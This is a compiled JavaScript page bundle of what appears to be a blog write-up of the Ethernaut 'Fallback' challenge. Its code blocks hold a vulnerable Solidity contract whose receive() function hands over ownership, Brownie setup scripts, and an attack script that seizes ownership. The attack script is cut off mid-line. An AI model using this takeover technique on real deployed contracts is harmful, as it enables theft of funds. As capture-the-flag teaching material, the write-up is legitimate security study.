import{S as Fc,i as cc,s as rc,W as Rt,w as BF,x as $F,y as VF,Z as ic,_ as jF,f as HF,t as qF,z as KF,$ as MF,k as a,q as t,a as c,T as v,e as SF,l as o,m as n,r as p,h as e,c as r,U as f,n as M,b as i,D as s,E as yc}from"../../../../chunks/index-9671d79c.js";import{P as dc}from"../../../../chunks/post_layout-76c250d8.js";import{I as Ec}from"../../../../chunks/post_card-ea1dea7e.js";function Dc(Ds){let y,_,A,x,d,C,vs,J,fs,Rs,Ra,ja,Ma,Q,js,Sa,Wa,hs,Ba,Ms,$a,Va,ss,us,Ss,Ha,qa,Ka,k,Ws,za,Za,Bs,Ga,Ya,$s,Xa,Ja,Vs,Qa,so,Hs,qs,Ks,lo,Je,zs,zF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">// SPDX-License-Identifier: MIT</span></div><div class='line'><span style="color: #EEFFFF">pragma solidity </span><span style="color: #89DDFF">^</span><span style="color: #F78C6C">0.6</span><span style="color: #89DDFF">.</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">@openzeppelin/contracts/math/SafeMath.sol</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">contract Fallback </span><span style="color: #89DDFF">&#123;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #EEFFFF">using</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">SafeMath</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">for</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">uint256</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #82AAFF">mapping</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">address</span><span style="color: #F07178"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">uint</span><span style="color: #F07178">) </span><span style="color: #EEFFFF">public</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">contributions</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #EEFFFF">address</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">payable</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">public</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">owner</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #82AAFF">constructor</span><span style="color: #F07178">() </span><span style="color: #EEFFFF">public</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">owner</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178">] </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #F78C6C">1000</span><span style="color: #F07178"> </span><span style="color: #89DDFF">*</span><span style="color: #F07178"> (</span><span style="color: #F78C6C">1</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">ether</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #EEFFFF">modifier</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">onlyOwner</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #82AAFF">require</span><span style="color: #F07178">(</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178"> </span><span style="color: #89DDFF">==</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">owner</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">caller is not the owner</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #F07178">        )</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #EEFFFF">_</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">function</span><span style="color: #F07178"> </span><span style="color: #82AAFF">contribute</span><span style="color: #89DDFF">()</span><span style="color: #F07178"> </span><span style="color: #82AAFF">public</span><span style="color: #F07178"> </span><span style="color: #82AAFF">payable</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #82AAFF">require</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178"> </span><span style="color: #F78C6C">0.001</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">ether</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178">] </span><span style="color: #89DDFF">+=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">if</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178">] </span><span style="color: #89DDFF">&gt;</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">owner</span><span style="color: #F07178">]) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #EEFFFF">owner</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">function</span><span style="color: #F07178"> </span><span style="color: #82AAFF">getContribution</span><span style="color: #89DDFF">()</span><span style="color: #F07178"> </span><span style="color: #82AAFF">public</span><span style="color: #F07178"> </span><span style="color: #82AAFF">view</span><span style="color: #F07178"> </span><span style="color: #82AAFF">returns</span><span style="color: #F07178"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">uint</span><span style="color: #89DDFF">)</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178">]</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">function</span><span style="color: #F07178"> </span><span style="color: #82AAFF">withdraw</span><span style="color: #89DDFF">()</span><span style="color: #F07178"> </span><span style="color: #82AAFF">public</span><span style="color: #F07178"> </span><span style="color: #82AAFF">onlyOwner</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">owner</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">transfer</span><span style="color: #F07178">(</span><span style="color: #82AAFF">address</span><span style="color: #F07178">(</span><span style="color: #89DDFF">this</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">balance</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">  </span></div><div class='line'><span style="color: #89DDFF">  </span><span style="color: #546E7A">// fallback fn. :)</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #82AAFF">receive</span><span style="color: #F07178">() </span><span style="color: #EEFFFF">external</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">payable</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #82AAFF">require</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #F07178"> </span><span style="color: #F78C6C">0</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">contributions</span><span style="color: #F07178">[</span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #F07178">] </span><span style="color: #89DDFF">&gt;</span><span style="color: #F07178"> </span><span style="color: #F78C6C">0</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">owner</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">msg</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sender</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,Zs,ls,_s,eo,Qe,As,Gs,ao,sa,Ys,ZF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">brownie init</span></div></code></div></pre>`,Xs,L,Js,es,oo,Qs,no,to,po,sl,P,Fo,ll,co,ro,el,io,yo,Eo,al,ol,nl,Do,la,tl,GF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">export</span><span style="color: #EEFFFF"> PRIVATE_KEY=0xb8abda....231</span></div><div class='line'><span style="color: #C792EA">export</span><span style="color: #EEFFFF"> WEB3_INFURA_PROJECT_ID=c2abfm......haha</span></div></code></div></pre>`,pl,S,as,vo,Fl,fo,ho,uo,cl,rl,_o,ea,il,YF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">dependencies:</span></div><div class='line'><span style="color: #EEFFFF">  - OpenZeppelin/openzeppelin-contracts@3.0.0</span></div><div class='line'><span style="color: #EEFFFF">compiler:</span></div><div class='line'><span style="color: #EEFFFF">  solc:</span></div><div class='line'><span style="color: #EEFFFF">    remappings:</span></div><div class='line'><span style="color: #EEFFFF">      - </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">@openzeppelin=OpenZeppelin/openzeppelin-contracts@3.0.0</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">dotenv: .env</span></div><div class='line'><span style="color: #EEFFFF">networks:</span></div><div class='line'><span style="color: #EEFFFF">  default: mainnet-fork</span></div><div class='line'><span style="color: #EEFFFF">  rinkeby:</span></div><div class='line'><span style="color: #EEFFFF">    verify: False</span></div><div class='line'><span style="color: #EEFFFF">wallets:</span></div><div class='line'><span style="color: #EEFFFF">  from_key: </span><span style="color: #89DDFF">$&#123;</span><span style="color: #EEFFFF">PRIVATE_KEY</span><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,yl,W,dl,U,Ao,El,mo,wo,Dl,bo,Co,ko,vl,B,fl,go,Oo,hl,Io,Lo,aa,ul,XF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">// SPDX-License-Identifier: MIT</span></div><div class='line'><span style="color: #EEFFFF">pragma solidity </span><span style="color: #89DDFF">^</span><span style="color: #F78C6C">0.6</span><span style="color: #89DDFF">.</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">interface</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Fallback</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">contribute</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">external</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">payable</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">getContribution</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">external</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">withdraw</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">external</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div></code></div></pre>`,_l,$,os,No,Al,To,xo,Po,ml,wl,Uo,oa,bl,JF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> brownie </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> network</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> accounts</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> config</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">FORKED_LOCAL_ENVIRONMENTS </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">mainnet-fork</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">mainnet-fork-dev</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span></div><div class='line'><span style="color: #EEFFFF">LOCAL_BLOCKCHAIN_ENVIRONMENTS </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">development</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">ganache-local</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">ganache-local-new-chainId</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #89DDFF">]</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">get_account</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #EEFFFF">        network</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">show_active</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> LOCAL_BLOCKCHAIN_ENVIRONMENTS</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">or</span><span style="color: #EEFFFF"> network</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">show_active</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> FORKED_LOCAL_ENVIRONMENTS</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> accounts</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">],</span><span style="color: #EEFFFF"> accounts</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">]</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> network</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">show_active</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> config</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">networks</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> accounts</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">add</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">config</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">wallets</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">][</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">from_key</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">])</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">None</span></div></code></div></pre>`,Cl,m,kl,V,gl,Ro,jo,Ol,Mo,So,Wo,Il,w,Ll,Bo,$o,Nl,Vo,Ho,Tl,qo,Ko,xl,zo,Zo,Go,Pl,Ul,Yo,Xo,Rl,jl,Ml,Jo,na,Sl,QF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> brownie </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Fallback</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> scripts</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">helpful_scripts </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> get_account</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">deploy</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    owner</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> _ </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">get_account</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    fallback </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Fallback</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">deploy</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">from</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> owner</span><span style="color: #89DDFF">&#125;)</span></div><div class='line'><span style="color: #EEFFFF">    </span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Contract Deployed to </span><span style="color: #82AAFF">&#123;fallback</span><span style="color: #89DDFF">.</span><span style="color: #F07178">address</span><span style="color: #82AAFF">&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> fallback</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> owner</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">main</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">deploy</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,Wl,N,Bl,R,Qo,$l,sn,ln,Vl,en,an,on,Hl,ql,nn,tn,Kl,zl,Zl,pn,ta,Gl,sc=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> brownie </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> interface</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> web3 </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Web3</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> colorama </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Fore</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> scripts</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">deploy </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> deploy</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> scripts</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">helpful_scripts </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> get_account</span></div><div class='line'></div><div class='line'><span style="color: #546E7A"># ? Global variables</span></div><div class='line'><span style="color: #EEFFFF">AMOUNT </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0.00002</span></div><div class='line'><span style="color: #EEFFFF">CONVERTED_AMOUNT </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Web3</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toWei</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">AMOUNT</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">ether</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #546E7A"># * colours</span></div><div class='line'><span style="color: #EEFFFF">green </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Fore</span><span style="color: #89DDFF">.</span><span style="color: #F07178">GREEN</span></div><div class='line'><span style="color: #EEFFFF">red </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Fore</span><span style="color: #89DDFF">.</span><span style="color: #F07178">RED</span></div><div class='line'><span style="color: #EEFFFF">blue </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Fore</span><span style="color: #89DDFF">.</span><span style="color: #F07178">BLUE</span></div><div class='line'><span style="color: #EEFFFF">magenta </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Fore</span><span style="color: #89DDFF">.</span><span style="color: #F07178">MAGENTA</span></div><div class='line'><span style="color: #EEFFFF">reset </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Fore</span><span style="color: #89DDFF">.</span><span style="color: #F07178">RESET</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">attack</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">contract_address</span><span style="color: #89DDFF">=None,</span><span style="color: #EEFFFF"> attacker</span><span style="color: #89DDFF">=None):</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> contract_address </span><span style="color: #89DDFF">is</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">None:</span></div><div class='line'><span style="color: #EEFFFF">        fallback_contract</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> owner </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">deploy</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">        contract_address </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> fallback_contract</span><span style="color: #89DDFF">.</span><span style="color: #F07178">address</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #546E7A"># ? Geeting the accounst for local testing</span></div><div class='line'><span style="color: #EEFFFF">        _</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> attacker </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">get_account</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #546E7A"># print(contract_address)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #546E7A"># print(attacker)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #546E7A"># exit(1)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    fallback </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> interface</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Fallback</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">contract_address</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    contrib_tx </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> fallback</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">contribute</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">from</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> attacker</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">value</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> CONVERTED_AMOUNT</span><span style="color: #89DDFF">&#125;)</span></div><div class='line'><span style="color: #EEFFFF">    contrib_tx</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">wait</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;green&#125;</span><span style="color: #C3E88D">Contributed </span><span style="color: #82AAFF">&#123;AMOUNT&#125;</span><span style="color: #C3E88D"> ETH to the contract</span><span style="color: #82AAFF">&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Contract Balance: </span><span style="color: #82AAFF">&#123;green&#125;&#123;Web3</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">fromWei</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">fallback_contract</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">balance</span><span style="color: #89DDFF">(),</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">ether</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span><span style="color: #82AAFF">&#125;</span><span style="color: #C3E88D"> ETH</span><span style="color: #82AAFF">&#123;reset&#125;</span><span style="color: #C3E88D">"</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #546E7A"># ? Invoking the fallback fn. i.e. the recieve() methind in solidity which enables a contract to accept payments</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;red&#125;</span><span style="color: #C3E88D">Doing the Attack by invoking the fallback fn.</span><span style="color: #82AAFF">&#123;reset&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    attack_tx </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> attacker</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">transfer</span><span style="color: #89DDFF">(</span><span style="color: 